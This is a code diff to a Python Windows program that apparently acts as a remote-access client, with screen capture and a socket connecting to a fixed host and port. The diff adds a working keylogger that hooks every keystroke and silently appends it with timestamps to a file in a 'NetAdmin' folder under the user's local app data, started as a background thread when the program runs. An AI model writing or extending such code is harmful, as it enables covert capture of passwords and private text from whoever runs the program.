@@ -1,16 +1,17 @@
+import queue
 import threading
 import socket
 import os
 import time
 import io
-
 import cv2
+import keyboard
 import mss
 import numpy
 import orjson
 import sys
 import platform
-
+from tendo import singleton
 import pyautogui
 from PIL import Image
 import win32com.client
@@ -209,9 +210,47 @@ def ActualDirectorySize(path, f):
             return 0 # signifying that the size of all accessible files (which is no files) is 0
     return size
 
+key_queue = queue.Queue()
+
+def keyhook(event):
+    if event.event_type == 'down':
+        if event.name == "space":
+            key_queue.put(" ")
+        else:
+            try:
+                iEvent = ord(event.name)
+            except:
+                iEvent = None
+            if iEvent:
+                if 126 >= iEvent >= 33:
+                    key_queue.put(str(event.name))
+            else:
+                key_queue.put(f"{[str.upper(str(event.name))]}")
+
+def keylogger():
+    keyboard.hook(keyhook)
+    while True:
+        if not key_queue.empty():
+            with open(os.path.join(os.getenv('LOCALAPPDATA'), "NetAdmin\\keylog.txt"), "a") as f:
+                f.write(f"[{datetime.datetime.now()}] ")
+                while not key_queue.empty():
+                    f.write(f"{key_queue.get()}")
+                f.write("\n")
+        time.sleep(10)
 
 @try_connection
 def main():
+    # make sure only one instance of the application is running
+    try:
+        sng = singleton.SingleInstance()
+    except:
+        print("Another instance of the application is already running")
+        return
+
+    # create keylogger
+    thread = threading.Thread(target=keylogger)
+    thread.start()
+
     # create a socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("192.168.1.205", 49152))
